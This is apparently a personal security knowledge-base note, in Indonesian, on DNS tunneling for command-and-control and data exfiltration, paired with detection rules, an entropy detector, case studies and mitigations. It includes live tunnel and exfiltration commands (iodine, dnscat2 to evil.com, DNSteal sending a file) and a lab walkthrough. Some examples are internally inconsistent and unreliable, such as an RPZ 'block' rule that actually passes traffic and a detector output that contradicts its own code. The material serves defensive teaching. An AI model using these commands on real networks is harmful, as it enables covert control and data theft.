---
title: DNS Tunneling — Deep Dive
tags:
  - cyber-security
  - library
  - network-threats
created: "2026-07-02"
updated: "2026-07-02"
status: pending
cssclasses: ""
---

# 🕸️ DNS TUNNELING — Deep Dive: Eksploitasi DNS untuk C2 & Exfiltrasi Data

> **DNS Tunneling** adalah teknik penyelundupan data melalui protokol DNS dengan cara mengenkapsulasi data non-DNS di dalam query dan response DNS. Karena DNS hampir selalu diizinkan melewati firewall dan tidak diinspeksi secara ketat, protokol ini menjadi vektor favorit untuk command-and-control (C2) communication dan data exfiltration. Bahkan jaringan yang paling ketat sekalipun — tanpa proxy explicit — biasanya masih mengizinkan DNS keluar.

> [!info] Hubungan ke Vault
> Ini adalah deep dive untuk topik **DNS Tunneling**, bagian dari threat landscape di Layer 3 (Network) dan Layer 7 (Application). Terkait dengan [[network-security]] (posisi threat di OSI Layer), [[blueteam-detection-matrix]] (deteksi pattern C2), [[blueteam-vs-enterprise-c2]] (counter-measure terhadap C2 infrastructure), dan [[ids-ips-waf-nsm-comparison]] (tools untuk mendeteksi tunneling). Juga beririsan dengan [[comprehensive-threat-directory]] untuk TTP mapping.

---

## Daftar Isi

- [[#Mengapa DNS Menjadi Vektor Favorit]]
- [[#Anatomi Protokol DNS yang Dieksploitasi]]
- [[#Teknik Encoding & Enkapsulasi]]
- [[#Klasifikasi Jenis DNS Tunnel]]
- [[#Tools — Perbandingan & Analisis]]
- [[#Detection — Traffic Analysis and Deep Packet Inspection]]
- [[#Sigma Rules and Detection Logic]]
- [[#Entropy Analysis — Konsep dan Implementasi]]
- [[#Case Studies — DNS Tunnel di Alam Liar]]
- [[#Mitigation — DNS Firewall, DoH, dan Threat Intel]]
- [[#Hands-On — Setup iodine Tunnel dan Capture]]
- [[#DNS Tunnel vs Legitimate Traffic — Comparison Table]]
- [[#Koneksi ke Vault]]
- [[#References]]

---

## Mengapa DNS Menjadi Vektor Favorit

DNS adalah protokol tertua di internet (standarisasi 1983, RFC 1034/1035). Sifatnya yang **fundamental**, **state-less**, dan **hampir tidak pernah diblokir penuh** membuatnya ideal sebagai vektor covert channel.

### Faktor-Faktor Kerentanan

| Faktor                      | Penjelasan                                                      | Implikasi Keamanan                                          |
| --------------------------- | --------------------------------------------------------------- | ----------------------------------------------------------- |
| **Allow by default**        | Firewall hampir selalu mengizinkan UDP/53 keluar                | DNS tunnel bisa bypass firewall tanpa perlu port alternatif |
| **DNS resolver chain**      | Query diteruskan dari resolver ke resolver sampai authoritative | Traffic sulit dilacak ke sumber asli                        |
| **Packet kecil**            | DNS query biasanya < 100 byte                                   | Cocok untuk beaconing chunk data kecil                      |
| **Encoded payload**         | Data disembunyikan di field subdomain, TXT, CNAME               | IDS/IPS standar tidak membaca isi DNS                       |
| **Tidak ada state koneksi** | DNS UDP tidak memiliki session seperti TCP                      | Tidak ada handshake                                         |
| **Rate limit jarang**       | Banyak network tidak batasi DNS query/detik                     | Attacker pumping data tanpa throttling                      |

```
┌─────────────────────────────────────────────────────────┐
│                 FLOW DNS TUNNELING                       │
│                                                          │
│  ┌──────────┐   DNS Query (encoded data)   ┌──────────┐ │
│  │  Victim  │ ────────────────────────────► │  DNS     │ │
│  │  (Client)│       subdomain.attacker.com  │ Resolver │ │
│  │          │◄────────────────────────────  │  Local   │ │
│  └──────────┘   DNS Response (decoded data) └────┬─────┘ │
│                                                   │       │
│                                                   ▼       │
│                                          ┌──────────┐     │
│                                          │  C2      │     │
│                                          │  Server  │     │
│                                          │ (Auth NS)│     │
│                                          └──────────┘     │
│                                                          │
│  Data: <base64-chunk>.<tunnel-domain>.<tld>             │
│  Respon: TXT / CNAME / MX record                        │
└─────────────────────────────────────────────────────────┘
```

---

## Anatomi Protokol DNS yang Dieksploitasi

### DNS Query Structure — RFC 1035

Setiap DNS query terdiri dari header (12 byte) + question section:

```text
DNS Message Format:
+------------------------------+
|  Header (12 bytes)           |  ID, flags, counts
+------------------------------+
|  Question Section            |  QNAME (domain name)
|  - QNAME (variable len)      |  YANG DIPAKAI — max 255 bytes
|  - QTYPE (2 bytes)            |  TXT, MX, CNAME
|  - QCLASS (2 bytes)           |  biasanya IN (1)
+------------------------------+
|  Answer / Authority / Addnl  |  RESPONSE — TXT records
+------------------------------+
```

### Field yang Paling Sering Dieksploitasi

| Field                   | Kapasitas           | Digunakan Untuk | Contoh Penggunaan          |
| ----------------------- | ------------------- | --------------- | -------------------------- |
| **QNAME (subdomain)**   | 255 bytes per query | Outbound data   | `ZmxhZ3Q=.tunnel.evil.com` |
| **TXT record response** | 65,535 bytes        | Inbound data    | Command, payload           |
| **CNAME record**        | 255 bytes           | Redirect signal | Petunjuk channel           |
| **MX record**           | variable            | Alternatif TXT  | Exchange impersonation     |
| **NULL record**         | 65,535 bytes        | Raw binary      | Iodine mode NULL           |
| **EDNS0 (OPT RR)**      | 65,535 bytes        | Fragmentasi     | Extend UDP size            |

### Query Types yang Biasa Disalahgunakan

| Record Type    | Default Function         | Tunneling Use Case           |
| -------------- | ------------------------ | ---------------------------- |
| **A**          | Resolve hostname ke IPv4 | Baseline — data di subdomain |
| **AAAA**       | Resolve hostname ke IPv6 | Dual-stack evasion           |
| **TXT**        | Text metadata domain     | Primary payload delivery     |
| **MX**         | Mail exchange record     | Alternatif TXT               |
| **CNAME**      | Canonical name alias     | Redirect signal, C2 staging  |
| **SVCB/HTTPS** | Service binding          | Tunnel via DoH               |
| **NULL**       | Raw experimental         | Iodine direct binary         |

---

## Teknik Encoding & Enkapsulasi

Data biner harus di-encode agar bisa lewat DNS (hanya alfanumerik + hyphen + dot di QNAME).

### Perbandingan Encoding Scheme

| Encoding           | Alphabet               | Efisiensi | Karakter           | Contoh Tools          |
| ------------------ | ---------------------- | --------- | ------------------ | --------------------- |
| **Base32**         | A-Z, 2-7, =            | ~64%      | Aman               | iodine (default)      |
| **Base64**         | A-Z, a-z, 0-9, +, /, = | ~75%      | + dan / bermasalah | dnscat2 (opsional)    |
| **Base64 URL**     | A-Z, a-z, 0-9, -, _    | ~75%      | Aman               | Cobalt Strike, Heyoka |
| **Base36**         | 0-9, A-Z               | ~59%      | Paling aman        | OzymanDNS (old)       |
| **Hex**            | 0-9, a-f               | ~50%      | Mudah dibaca       | dnscat2 fallback      |
| **Custom charset** | Variable               | 80%+      | Berisiko           | Heyoka custom         |

### Ilustrasi Encoding Flow

```text
Data mentah: "FLAG{exfiltrate_me}"
     |
     v  (compress — gzip/zlib optional)
Bytes terkompresi: [0x1F 0x8B 0x08 ...]
     |
     v  (encode — Base64 URL-safe)
String: "RkxBR3tleGZpbHRyYXRlX21lfQ=="
     |
     v  (chunk ke label DNS — max 63 chars per label)
Label 1: "RkxBR3tleGZpbHRy"   (15 bytes decoded)
Label 2: "YXRlX21lfQo="       (sisanya)
     |
     v  (gabung dengan domain)
Query: "RkxBR3tleGZpbHRy.YXRlX21lfQo=.tunnel.evil.com"
     |
     v  (kirim ke DNS resolver -> authoritative NS Attacker)
```

### Kompresi per Tool

- **iodine**: gzip + Base32 — upstream dikompresi, di-encode Base32, per label.
- **dnscat2**: encrypted + Base64 — Salsa20/AES, lalu encode Base64.
- **Heyoka**: custom binary encoding — fragmentasi di IP, reassembly di server.
- **Cobalt Strike DNS Beacon**: AES-256 + Base64 URL — metadata session + tasks.

---

## Klasifikasi Jenis DNS Tunnel

### Berdasarkan Arah Data

| Jenis                           | Deskripsi                        | Contoh Tools                   |
| ------------------------------- | -------------------------------- | ------------------------------ |
| **Unidirectional (exfil only)** | Data hanya dari client ke server | DNSteal, python scripts        |
| **Bidirectional (C2)**          | Client-Server full duplex        | dnscat2, Cobalt Strike, iodine |
| **Tunnel (full IP)**            | Layer 3 — semua protokol IP      | iodine, heyoka                 |

### Berdasarkan Metadata

| Type                         | Cara Kerja                       | Kecepatan                 | Detectability |
| ---------------------------- | -------------------------------- | ------------------------- | ------------- |
| **Direct (raw UDP/53)**      | Langsung ke server authoritative | Sangat cepat              | Mudah         |
| **Resolver-based (relayed)** | Lewat resolver lokal             | Lambat (70-150ms per hop) | Sulit         |
| **Hybrid**                   | Resolver + fallback direct       | Moderate                  | Medium        |

### Berdasarkan Kapasitas

| Level       | Throughput Khas | Tools                  | Use Case                     |
| ----------- | --------------- | ---------------------- | ---------------------------- |
| **Low**     | 1-10 bps        | DNSteal, custom        | Exfil file kecil, keylogging |
| **Medium**  | 100-500 bps     | dnscat2, CS DNS beacon | C2 shell, tasking            |
| **High**    | 1-30 kbps       | iodine, heyoka         | SSH, RDP, HTTP tunnel        |
| **Extreme** | 100+ kbps       | iodine + EDNS0         | Video streaming (noisy)      |

---

## Tools — Perbandingan dan Analisis

| Tool              | Fungsi            | Arsitektur             | Enkripsi    | Encoding      | Throughput  | Platform          | Status      |
| ----------------- | ----------------- | ---------------------- | ----------- | ------------- | ----------- | ----------------- | ----------- |
| **iodine**        | IP tunnel (L3)    | C, client-server       | None        | gzip + Base32 | 1-30 kbps   | Linux, macOS, Win | Active      |
| **dnscat2**       | C2 channel (L7)   | C client + Ruby server | Salsa20/AES | Base64 / hex  | 100-500 bps | Cross-platform    | Active      |
| **Cobalt Strike** | C2 framework      | Java Malleable         | AES-256     | Base64 custom | 100-500 bps | Win + Linux       | Active      |
| **Heyoka**        | IP tunnel (multi) | C++                    | XOR         | Custom binary | 10-100 kbps | Linux             | Dead (2007) |
| **DNSteal**       | File exfil        | Python                 | None        | Base32        | 1-50 bps    | Cross-platform    | Active      |
| **OzymanDNS**     | TCP tunnel        | Perl                   | None        | Base32/36     | 10-100 bps  | Unix              | Dead (2004) |
| **DNS2TCP**       | TCP tunnel        | C                      | None        | Base32        | 1-10 kbps   | Linux             | Inactive    |
| **NSTX**          | IP tunnel         | C                      | None        | Hex/Base64    | 1-5 kbps    | Linux             | Dead (2006) |
| **tuns**          | TCP tunnel        | Go                     | TLS         | Binary        | 1-20 kbps   | Cross-platform    | Active      |

### Detail Tools Utama

#### iodine — The IP Tunnel King

- Membuat TUN interface di kedua sisi. Paket IP dikompresi, difragmentasi, dikirim sebagai QNAME.
- Fragment offset system — payload 16-bit fragment, reassembly di sisi lain.
- Autoprobe fragment size — deteksi EDNS0 support.
- Password auth — shared secret, bukan enkripsi payload.
- Limitasi: tidak ada enkripsi end-to-end.

```bash
# Server (authoritative NS untuk t1.evil.com)
iodined -f -c -P secretpass 10.0.0.1 t1.evil.com

# Client
iodine -f -P secretpass t1.evil.com
```

#### dnscat2 — The C2 Specialist

- Client kirim data terenkripsi sebagai subdomain. Server Ruby dekode, execute command, response lewat TXT.
- Session-based: MaxSegmentSize negotiation, sequence numbering, retransmission.
- Encryption: Salsa20/AES-256 dengan ECDH key exchange.
- Command: shell, exec, download, upload, port forward, ping.
- Detection: prefix "dnscat." default, rate query TXT tinggi.

```bash
# Server
ruby dnscat2.rb --dns domain=evil.com

# Client direct
./dnscat --dns server=evil.com

# Client relay
./dnscat evil.com
```

#### Cobalt Strike DNS Beacon

- DNS Beacon = C2 channel untuk task check. Beacon polling dengan TXT query ke domain C2.
- Malleable C2 Profile: kustomisasi panjang subdomain, TXT size, jitter.
- Hybrid: DNS untuk task poll, HTTP/HTTPS untuk data transfer besar.
- Signature: subdomain konsisten, interval fixed.

#### Heyoka (Historic)

- DNS query fragmentation — paket IP dipecah, dikirim paralel via multi-connection.
- Multi-threaded throughput melebihi rate limit resolver.
- Projekt terakhir 2007. Referensi akademik "high-performance DNS tunnel."

#### DNSteal — Quick Exfil

- Python: file -> gzip -> base32 -> subdomain -> NS.
- One-shot exfiltration, tanpa interactive channel.
- Parameter: `-b` (bytes/subdomain), `-s` (subdomains/query), `-f` (filename length).

```bash
# Server (fake NS)
python dnsteal.py 0.0.0.0 -z -v

# Client — exfiltrasi file
python dnsteal.py 192.168.1.100 -z -v secret.docx
```

---

## Detection — Traffic Analysis and Deep Packet Inspection

### Volume Analysis

| Metric                  | Normal      | Suspicious    | Keterangan              |
| ----------------------- | ----------- | ------------- | ----------------------- |
| DNS queries/min/host    | 1-20        | 50+           | Terutama TXT, MX, CNAME |
| QNAME length            | 15-40 chars | > 60 chars    | Subdomain panjang       |
| TXT record ratio        | < 1% DNS    | > 10% DNS     | TXT jarang dipakai      |
| Unique subdomain/domain | 10-100/hari | Ratusan/menit | Random generation       |
| NXDOMAIN rate           | 1-5%        | 10%+          | Brute-force setup       |

### Entropy Analysis — Metrik Paling Kuat

```text
Entropy per label DNS:
  Normal: "login"           ~2.5 bits/char
  Normal: "www"             ~1.8 bits/char
  Normal: "api-v2"          ~2.8 bits/char
  Tunnel: "ZmxhZ3t0aGlz"   ~4.7 bits/char  (base64)
  Tunnel: "jd82kDjs92ld"   ~4.5 bits/char  (random)
  Tunnel: "dGhpcyBpcyBhIH" ~4.8 bits/char  (base32)
```

Threshold: **Entropy > 3.5** = suspicious. **> 4.2** = highly likely tunnel.

### Domain Pattern Analysis

- Long subdomain (> 50 chars)
- High cardinality per parent domain
- Base64 character dominance
- Periodic/beaconing interval
- Newly registered domain (< 30 hari)

### Deep Packet Inspection

| Signature           | Device       | Detection Method     |
| ------------------- | ------------ | -------------------- |
| TXT terlalu besar   | NGFW         | TXT > 200 bytes      |
| Query rate tinggi   | IPS          | > 30 qpm ke 1 domain |
| Entropy > threshold | Custom       | Hitung per query     |
| Rare record type    | DNS firewall | TXT, MX, SRV, NULL   |
| EDNS0 > 1232 bytes  | NGFW         | Fragmentasi tunnel   |
| No resolver caching | DNS logs     | Random subdomain     |

### Time-Based Analysis

- Jitter terlalu rendah (mechanical vs natural)
- Non-business hours aktivitas DNS tinggi
- Correlation: lonjakan DNS bersamaan file access

---

## Sigma Rules and Detection Logic

### Sigma Rule — High Volume DNS TXT Queries

```yaml
title: High Volume DNS TXT Queries to Single Domain
id: f1b3d7c2-9a4e-4f2b-8c3d-1e5a7b9c0d2e
status: experimental
description: Detects abnormally high number of DNS TXT queries
logsource:
  category: dns
  product: windows
  service: dns-server
detection:
  selection:
    QueryType: "TXT"
    DomainName|endswith:
      - ".xyz"
      - ".top"
      - ".club"
      - ".online"
  timeframe: 5m
  condition: selection | count() by DomainName > 30
falsepositives:
  - Legitimate SPF DKIM lookups
level: medium
```

### Sigma Rule — DNS Subdomain Entropy

```yaml
title: High Entropy DNS Subdomain
id: a8e3c4b6-7d2f-4e9a-1b3c-5d8f7a2e4c6b
status: experimental
description: Detects DNS queries with Shannon entropy > 4.0
logsource:
  category: dns
  product: zeek
detection:
  selection:
    query|re: '[a-zA-Z0-9+/=_-]{45,}\.[a-z0-9-]+\.[a-z]+'
  condition: selection
falsepositives:
  - Long CDN cache keys
level: high
```

### Suricata Rule

```suricata
alert udp any any -> any 53 (
    msg:"Potential DNS Tunnel - High TXT Rate";
    dns.query_type:TXT;
    threshold: type both, track by_dst, count 30, seconds 60;
    classtype:bad-unknown;
    sid:1000001;
    rev:1;
)
```

### Zeek Script — Entropy Detection

```zeek
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count)
{
    local labels = split_string(query, /\\./);
    local first_label = labels[0];
    local entropy = 0.0;
    local freq: table[string] of count = table();
    for (i in first_label) {
        local ch = sub_bytes(first_label, i, 1);
        ++freq[ch];
    }
    local len = |first_label|;
    if (len == 0) return;
    for ([ch], count in freq) {
        local p = count / len;
        entropy += p * log10(p) / log10(2.0);
    }
    entropy = -entropy;
    if (entropy > 4.0 && len > 40)
        NOTICE([$note=Notice::ACTION_LOG,
                $msg=fmt("High entropy DNS: %s (%.2f, %d)",
                         query, entropy, len)]);
}
```

---

## Entropy Analysis — Konsep dan Implementasi

Shannon Entropy untuk DNS labels:

$$H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$$

### Python Implementation

```python
#!/usr/bin/env python3
"""
dns_entropy_detector.py — Deteksi DNS tunneling via Shannon entropy.
Pipeline: tcpdump -> parsing -> entropy analysis.
"""

import math
import sys
from collections import Counter

def shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    return -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )

def is_suspicious(entropy: float, length: int) -> str:
    if length < 30:
        return "Benign (pendek)"
    if entropy < 3.0:
        return "Benign"
    if entropy < 3.8:
        return "Suspicious"
    if entropy < 4.5:
        return "Highly Suspicious"
    return "Critical — pasti encoded"

def analyze_dns_log(filepath: str, threshold: float = 3.5):
    suspicious = []
    with open(filepath, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('|')
            if len(parts) < 3:
                continue
            _, src_ip, query_raw, *_ = parts
            labels = query_raw.split('.')
            if len(labels) < 2:
                continue
            payload = labels[0]
            ent = shannon_entropy(payload)
            if ent >= threshold:
                suspicious.append({
                    'line': line_num,
                    'src': src_ip,
                    'query': query_raw,
                    'entropy': round(ent, 2),
                    'length': len(payload),
                    'status': is_suspicious(ent, len(payload)),
                })
    return suspicious

def print_report(results: list):
    if not results:
        print("[OK] No DNS tunneling detected.")
        return
    print(f"[!] Found {len(results)} suspicious queries:\n")
    header = f"{'Line':<6} {'Source IP':<18} {'Entropy':<8} {'Len':<6} {'Status':<30} Query"
    print(header)
    print("-" * 120)
    for r in results[:30]:
        print(f"{r['line']:<6} {r['src']:<18} {r['entropy']:<8} "
              f"{r['length']:<6} {r['status']:<30} {r['query'][:50]}...")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: dns_entropy_detector.py <dns_log.txt> [threshold=3.5]")
        sys.exit(1)
    threshold = float(sys.argv[2]) if len(sys.argv) > 2 else 3.5
    results = analyze_dns_log(sys.argv[1], threshold)
    print_report(results)
```

---

## Case Studies — DNS Tunnel di Alam Liar

### Case 1: Flame Malware (2012) — Nation-State DNS C2

| Aspek         | Detail                                       |
| ------------- | -------------------------------------------- |
| **Aktor**     | Nation-state (Stuxnet-related)               |
| **Target**    | Iran — energi, minyak, industri              |
| **Metode**    | DNS tunneling via subdomain untuk C2 + exfil |
| **Payload**   | Screenshot, keylog, dokumen — chunk kecil    |
| **Tool**      | Custom internal module                       |
| **Volume**    | Ratusan query/jam, 30-60 bytes/query         |
| **Durasi**    | ~2 tahun (2010-2012)                         |
| **Dampak**    | Ribuan host, jutaan dokumen                  |
| **Detection** | Kaspersky Lab 2012                           |

Flame menggunakan DNS sebagai **secondary C2 channel**. Primary lewat HTTP/HTTPS. Jika primary diblokir, fallback ke DNS. Data di DNS: command singkat, heartbeat, konfirmasi eksekusi.

```
2010-03  -> Flame deploy
2010-05  -> DNS tunnel module aktif
2011-01  -> Domain C2 diganti (lolos deteksi)
2012-05  -> Kaspersky: "Flame: Bunny and Blowfish"
2012-06  -> C2 sinkhole oleh CERT + Microsoft
```

### Case 2: DNSMessenger (2017) — PowerShell DNS RAT

| Aspek         | Detail                                     |
| ------------- | ------------------------------------------ |
| **Aktor**     | Cyber-espionage (suspected APT)            |
| **Target**    | Financial services                         |
| **Metode**    | PowerShell + DNS TXT queries untuk command |
| **Payload**   | PS code di TXT record -> decode -> invoke  |
| **Tool**      | Pure PowerShell (LOL)                      |
| **Detection** | Cisco Talos                                |

DNSMessenger = **fileless DNS tunneling**. Tidak ada binary tambahan. PowerShell ambil TXT record berisi kode terenkripsi.

### Case 3: OilRig (2016-2019) — DNS C2 untuk Espionage

| Aspek         | Detail                             |
| ------------- | ---------------------------------- |
| **Aktor**     | OilRig (APT34) — Iran              |
| **Target**    | Energi, minyak, gas Timur Tengah   |
| **Metode**    | Custom DNS tunnel via subdomain    |
| **Tool**      | Helminth backdoor + DNSExfiltrator |
| **Detection** | Palo Alto Unit 42                  |

OilRig menggunakan DNS sebagai **stealth channel utama**. Helminth kirim data per chunk kecil, sulit dideteksi signature-based IDS.

### Case 4: Chimera Group — Cobalt Strike Over DNS (2021)

| Aspek         | Detail                                              |
| ------------- | --------------------------------------------------- |
| **Aktor**     | Cybercrime/espionage                                |
| **Target**    | European organizations                              |
| **Metode**    | CS DNS beacon, DNS tasking + HTTPS data             |
| **Durasi**    | 3+ months                                           |
| **Indicator** | TXT query tiap 60s, jitter 15%, subdomain ~44 chars |

Chimera: DNS hanya untuk task check (45-75 detik). Task di-download via HTTPS. Sulit dideteksi volume-based alert.

---

## Mitigation — DNS Firewall, DoH, dan Threat Intel

### Defense in Depth

```
Layer 1: DNS Firewall / RPZ — blokir domain buruk & high-risk TLD
Layer 2: Traffic Anomaly — volume, entropy, rate analysis
Layer 3: Deep Packet Inspection — TXT record, ukuran DNS
Layer 4: DNS over HTTPS (DoH) — kontrol sentralisasi
Layer 5: Endpoint Detection — process monitoring
Layer 6: Threat Intelligence — domain reputation, passive DNS
```

### 1. DNS Firewall & RPZ

```bind
$TTL 86400
$ORIGIN rpz.local.
*.xyz            CNAME rpz-passthru.
*.top            CNAME rpz-passthru.
```

- Catch: DNS firewall hanya efektif untuk relay yang dikelola organisasi. Attacker bisa query langsung ke resolver publik.

### 2. Traffic Anomaly Thresholds

| Metric                              | Action Threshold | Notes                    |
| ----------------------------------- | ---------------- | ------------------------ |
| DNS queries/min/host > 50           | Alert            | Kecuali known (DC, mail) |
| TXT record > 10% DNS                | Alert            | Normal hanya SPF, DMARC  |
| Entropy subdomain > 3.8             | Review           | Whitelist CDN            |
| Subdomain length > 45 chars         | Review           | Whitelist CDN            |
| NXDOMAIN > 10%                      | Alert            | Bruteforce               |
| Newly registered domain (< 30 days) | Alert            | Domain tunnel baru       |
| EDNS0 > 1232 bytes                  | Review           | Fragmentasi              |

### 3. Endpoint Prevention

- Monitor process: `nslookup.exe`, `powershell.exe` dengan `Resolve-DnsName`, `System.Net.Dns` API
- Block tools: dnscat2.exe, iodine.exe
- Application whitelisting untuk DNS query
- Windows Event Log 5156: monitor UDP/53 dari process unknown

### 4. DNS over HTTPS (DoH)

| Sisi                     | Dampak                                                        |
| ------------------------ | ------------------------------------------------------------- |
| (+) Defender yang manage | Centralize logging + enforce policy                           |
| (-) Attacker             | Sembunyikan DNS dari NGFW                                     |
| Trade-off                | Jika tidak bisa inspect DoH, attacker pindah ke DoH eksternal |

Rekomendasi:

- Enterprise DoH resolver internal (Windows Server 2022+, NextDNS, Cloudflare Gateway)
- Blokir DoH ke resolver publik (1.1.1.1, 8.8.8.8, 9.9.9.9)
- SSL/TLS Inspection untuk decrypt DoH

### 5. Block Query Types

```text
- Block DNS TXT query to external (kecuali whitelisted SPF/DMARC)
- Block DNS MX query dari non-mail-server
- Block DNS NULL type
- Block DNS SRV query non-legitimate
```

### 6. Threat Intelligence Integration

| Intel Feed         | Function             | Integration             |
| ------------------ | -------------------- | ----------------------- |
| Passive DNS        | Domain -> IP history | Elasticsearch, Splunk   |
| URLhaus / abuse.ch | Known malicious      | DNS firewall auto-block |
| Emerging Threats   | DNS rules            | Suricata, Snort         |
| MISP / OpenCTI     | Custom intel         | Alert enrichment        |
| AlienVault OTX     | DNS pulses           | Correlation             |

---

## Hands-On — Setup iodine Tunnel dan Capture

### Topologi Lab

```text
+------------------+         +------------------+
|  iodine Client   |         |  iodine Server   |
|  (Victim)        |         |  (Attacker C2)   |
|  TUN: 10.0.1.2   |<------->|  TUN: 10.0.1.1   |
|                  |  DNS    |                  |
|                  |  UDP 53 |  Domain: t1.test |
+------------------+         +------------------+
```

### Step-by-Step

**1. Server:**

```bash
# Install
sudo apt install iodine

# Delegasi DNS di zone file:
# t1    IN  NS   t1ns.test.com.
# t1ns  IN  A    <PUBLIC_IP>

sudo iodined -f -c -P rahasia123 10.0.1.1 t1.test.com
```

**2. Client:**

```bash
sudo apt install iodine

# Via DNS resolver
sudo iodine -f -P rahasia123 t1.test.com

# Direct ke IP server
sudo iodine -f -P rahasia123 203.0.113.5
```

**3. Verify:**

```bash
# Server
ping -c 3 10.0.1.2
ssh user@10.0.1.2

# Client
ping -c 3 10.0.1.1
ssh user@10.0.1.1

# Bandwidth
iperf3 -c 10.0.1.1 -p 5201  # ~10-30 kbps
```

### Packet Capture

```bash
# Capture
sudo tcpdump -i any port 53 -w dns-tunnel.pcap

# Analisis dengan tshark — QNAME length
tshark -r dns-tunnel.pcap -Y 'dns.qry.name.len > 40' \
  -T fields -e frame.time -e ip.src -e dns.qry.name
```

### Simulasi Detection

```bash
# Sample log
echo "ts|src|query|qtype" > sample.txt
echo "00:01|10.0.0.1|login.normal.com|A" >> sample.txt
echo "00:02|10.0.0.1|www.normal.com|A" >> sample.txt
echo "00:03|10.0.0.1|RkxBR3tleGZpbHRyYXRlX21lfQo=.tunnel.evil.com|TXT" >> sample.txt

# Run detector
python3 dns_entropy_detector.py sample.txt 3.5
```

Expected output:

```
[!] Found 1 suspicious queries:

Line  Source IP         Entropy  Len    Status
3     10.0.0.1         4.72     28     Highly Suspicious
```

---

## DNS Tunnel vs Legitimate Traffic

| Karakteristik                 | Legitimate DNS         | DNS Tunneling         |
| ----------------------------- | ---------------------- | --------------------- |
| **Query interval**            | Random, request-driven | Periodik, mechanical  |
| **Subdomain length**          | 10-30 chars            | > 45 chars            |
| **Entropy per label**         | < 3.0                  | > 3.8                 |
| **Distinct domains/host**     | 5-50/hari              | 1-3/hari              |
| **TXT record ratio**          | < 1%                   | > 10%                 |
| **TXT response size**         | < 200 bytes            | Bisa > 1000 bytes     |
| **Query type distribution**   | A/AAAA dominan         | TXT, MX, CNAME tinggi |
| **EDNS0 usage**               | < 512 bytes            | Sering > 4096 bytes   |
| **Time of day**               | Business hours         | Datar 24 jam          |
| **NXDOMAIN rate**             | < 5%                   | Bisa > 20%            |
| **Cache behavior**            | Cache-friendly         | Cache-unfriendly      |
| **Correlation user activity** | Tinggi                 | Rendah                |

---

## Koneksi ke Vault

- [[network-security]] — DNS tunneling sebagai threat di OSI Layer 3 & 7
- [[blueteam-vs-enterprise-c2]] — Counter-measure DNS-based C2 infrastructure
- [[blueteam-detection-matrix]] — Matriks deteksi C2, DNS tunnel rules
- [[ids-ips-waf-nsm-comparison]] — Tools deteksi (Suricata, Zeek)
- [[comprehensive-threat-directory]] — TTP mapping
- [[digital-privacy-anonymity]] — DoH trade-off privacy vs security

**Planned notes:**

- [[covert-channel-encyclopedia]] — Semua jenis covert channel
- [[apt-c2-infrastructure]] — Enterprise C2 infrastructure

---

## References

1. iodined official docs — https://github.com/yarrick/iodine
2. dnscat2 official docs — https://github.com/iagox86/dnscat2
3. Cobalt Strike Malleable C2 — https://www.cobaltstrike.com/help-malleable-c2
4. MITRE ATT&CK T1572 — Protocol Tunneling — https://attack.mitre.org/techniques/T1572/
5. Cisco Talos — DNSMessenger analysis
6. Kaspersky Lab — "Flame: Bunny and Blowfish" (2012)
7. Palo Alto Unit 42 — OilRig Helminth analysis
8. RFC 1034 / 1035 — Domain Names
9. Shannon, C.E. — "A Mathematical Theory of Communication" (1948)

---

> [!tip] Bottom Line
> **DNS tunneling adalah covert channel paling efektif yang masih bertahan.** Karena DNS tidak bisa diblokir penuh, attacker akan selalu coba menyelundupkan data lewat protokol ini. Deteksi terbaik: **analisis anomali — volume, entropy, dan pattern timing**. Defense terkuat: kombinasi DNS firewall, entropy detection, endpoint monitoring, dan threat intelligence. Kebanyakan tunnel terdeteksi dengan entropy > 4.0 dan query rate > 50/menit ke domain tunggal. Catatan: APT canggih menggunakan low-and-slow untuk menjaga entropy dan rate di bawah threshold.
